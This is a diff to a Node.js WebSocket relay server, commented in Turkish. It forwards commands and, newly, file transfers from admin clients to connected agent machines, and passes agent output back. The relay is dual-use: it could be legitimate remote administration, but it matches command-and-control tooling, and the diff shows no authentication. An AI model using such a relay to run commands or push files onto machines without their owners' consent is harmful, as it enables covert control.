@@ -1,4 +1,4 @@
-// server.js (stabil sürüm)
+// server.js (stabil sürüm + admin->agent file forward)
 
 const http = require("http");
 const express = require("express");
@@ -68,7 +68,10 @@ wss.on("connection", (ws, req) => {
 
   ws.on("close", (code, reasonBuf) => {
     const reason = reasonBuf ? reasonBuf.toString() : "";
-    console.log(`[close] ${connId} code=${code} reason="${reason}" kind=${ws.kind || "-"} agentId=${ws.agentId || "-"} openAgents=${countOpen(agents)} openAdmins=${countOpen(admins)}`);
+    console.log(
+      `[close] ${connId} code=${code} reason="${reason}" kind=${ws.kind || "-"} agentId=${ws.agentId || "-"} ` +
+      `openAgents=${countOpen(agents)} openAdmins=${countOpen(admins)}`
+    );
     if (ws.kind === "agent" && ws.agentId && agents.has(ws.agentId)) {
       agents.delete(ws.agentId);
       broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
@@ -89,22 +92,38 @@ wss.on("connection", (ws, req) => {
         console.log(`[agent:hello] ${connId} => agentId=${ws.agentId} openAgents=${countOpen(agents)}`);
         broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
       } else if (msg.type === "resp" || msg.type === "file" || msg.type === "console_chunk" || msg.type === "console_end") {
+        // Agent'tan gelen yanıtları adminlere aktar
         broadcastAdmins({ type: msg.type, agentId: ws.agentId, payload: msg, ...msg });
-      } else {
-        // diğer tipler
       }
       return;
     }
 
     if (ws.kind === "admin") {
-      if (msg.type === "cmd" && msg.target && msg.cmd) {
+      // 1) Komutları forward et (cmd)
+      if (msg.type === "cmd") {
+        if (!msg.target || !msg.cmd) { sendJson(ws, { type: "error", message: "bad cmd payload" }); return; }
         const entry = agents.get(msg.target);
         if (entry && entry.ws.readyState === WebSocket.OPEN) {
-          sendJson(entry.ws, msg);
+          try { entry.ws.send(JSON.stringify(msg)); } catch {}
         } else {
           sendJson(ws, { type: "error", message: "agent not available" });
         }
+        return;
       }
+
+      // 2) Dosya transfer iletilerini forward et (file: start/chunk/end)
+      if (msg.type === "file") {
+        if (!msg.target || !msg.mode) { sendJson(ws, { type: "error", message: "bad file payload" }); return; }
+        const entry = agents.get(msg.target);
+        if (entry && entry.ws.readyState === WebSocket.OPEN) {
+          try { entry.ws.send(JSON.stringify(msg)); } catch {}
+        } else {
+          sendJson(ws, { type: "error", message: "agent not available" });
+        }
+        return;
+      }
+
+      // Diğer admin mesaj tipleri için buraya case ekleyebilirsin
       return;
     }
   });
